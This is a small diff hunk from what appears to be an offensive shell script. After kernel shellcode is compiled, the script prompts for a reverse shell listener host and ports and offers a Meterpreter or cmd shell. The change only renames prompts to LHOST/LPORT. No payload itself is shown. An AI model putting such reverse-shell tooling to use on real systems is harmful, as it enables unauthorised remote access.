@@ -17,11 +17,11 @@ echo kernel shellcode compiled, would you like to auto generate a reverse shell 
 read genMSF
 if [[ $genMSF =~ [yY](es)* ]]
 then
-    echo IP for reverse connection:
+    echo LHOST for reverse connection:
     read ip
-    echo PORT you want x64 to listen on:
+    echo LPORT you want x64 to listen on:
     read portOne
-    echo PORT you want x86 to listen on:
+    echo LPORT you want x86 to listen on:
     read portTwo
     echo Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
     read cmd
